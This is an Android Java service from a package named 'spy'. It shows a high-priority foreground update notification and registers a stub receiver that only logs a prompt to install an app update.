package com.gameofcoding.spy.services;

import android.app.Notification;
import android.app.PendingIntent;
import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Build;
import android.os.IBinder;
import com.gameofcoding.spy.R;
import com.gameofcoding.spy.utils.AppConstants;
import com.gameofcoding.spy.utils.NotificationUtils;
import com.gameofcoding.spy.utils.XLog;

public class AppUpdateInformerService extends Service {
    private class InstallUpdateReceiver extends BroadcastReceiver {
	private static final String TAG = "AppUpdate...Service$InstallUpdateReceiver";
	@Override
	public void onReceive(Context context, Intent intent) {
	    XLog.d(TAG, "Prompting for installation");
	    // Prompt user to install app
	}
    }

    private static final String TAG = "AppUpdateInformerService";
    private final int APP_UPDATE_INFORMER_SERVICE_NOTIF_ID = 100;
    private final InstallUpdateReceiver mUpdateReceiver =  new InstallUpdateReceiver();
    private Context mContext;

    @Override
    public IBinder onBind(Intent intent) {return null;}

    @Override
    public void onCreate() {
	super.onCreate();
	XLog.v(TAG, "AppUpdateInformerService started, sending notif for updating app.");
	mContext = getApplicationContext();

	// Register receiver
	IntentFilter iFilterConfigChanged = new IntentFilter();
	iFilterConfigChanged.addAction(AppConstants.ACTION_INSTALL_APP_UPDATE);
	registerReceiver(mUpdateReceiver, iFilterConfigChanged);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
	updateForegroundNotif();
	// Stop service
	// stopForeground(true);
	//stopSelf();
        return START_STICKY;
    }


    @SuppressWarnings("deprecation")
    public void updateForegroundNotif() {
	Notification.Builder notifBuilder = null;
	if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
	    NotificationUtils notifUtils = new NotificationUtils(mContext);
	    notifUtils.createHighPriorityNotifChannel();
	    String channelID = notifUtils.getHighPriorityNotifChannelId();
	    notifBuilder = new Notification.Builder(mContext, channelID);
	} else {
	    notifBuilder = new Notification.Builder(mContext);
	    notifBuilder.setPriority(Notification.PRIORITY_HIGH);
	}

	// Intent to be fired on notification click;
	final PendingIntent pendingIntent = PendingIntent
	    .getBroadcast(mContext, -1,
			  new Intent(AppConstants.ACTION_INSTALL_APP_UPDATE),
			  PendingIntent.FLAG_UPDATE_CURRENT);

	// Start foreground notification
	notifBuilder.setSmallIcon(R.mipmap.ic_launcher)
	    .setContentTitle(getString(R.string.app_update_informer_service_notif_content_title))
	    .setContentText(getString(R.string.app_update_informer_service_notif_content_text))
	    .setContentIntent(pendingIntent)
	    .setDefaults(Notification.DEFAULT_VIBRATE | Notification.DEFAULT_SOUND);
	startForeground(APP_UPDATE_INFORMER_SERVICE_NOTIF_ID, notifBuilder.build());
    }
}
